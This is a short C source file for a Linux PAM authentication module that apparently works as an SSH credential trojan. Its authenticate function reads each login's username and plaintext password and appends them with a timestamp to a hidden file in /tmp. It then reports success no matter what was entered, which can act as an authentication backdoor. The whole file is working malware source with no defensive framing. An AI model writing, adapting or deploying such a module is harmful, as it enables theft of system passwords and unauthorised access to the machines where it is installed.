#include <stdio.h>
#include <string.h>
#include <time.h>
#include <errno.h> 

#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

//===========  General  ==========//

void log_user(const char *username, const char *password)
{
    time_t t;
    time(&t);
    FILE *fp;
    fp = fopen("/tmp/.log_sshtrojan1.txt", "a+");
    if (fp == NULL)
    {
        perror("Error"); 
        return ;
    }
    fprintf(fp, "\n# %s", ctime(&t));
    fprintf(fp, "Username: %s\n", username);
    fprintf(fp, "Password: %s\n", password);
    fclose(fp);
}

//============  Auth  ============//
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const char *username;
    const char *password;

    pam_get_item(pamh, PAM_USER, (const void **)&username);
    // if (pam_code != PAM_SUCCESS)
    // {
    //     fprintf(stderr, "Unable to retrieve username");
    //     return PAM_IGNORE;
    // }

    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    // if (pam_code != PAM_SUCCESS)
    // {
    //     fprintf(stderr, "Unable to retrieve password");
    //     return PAM_IGNORE;
    // }

    // write credential out to file
    log_user(username, password);
    return PAM_SUCCESS;
}

/* Management Group */
// Credential
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_IGNORE;
}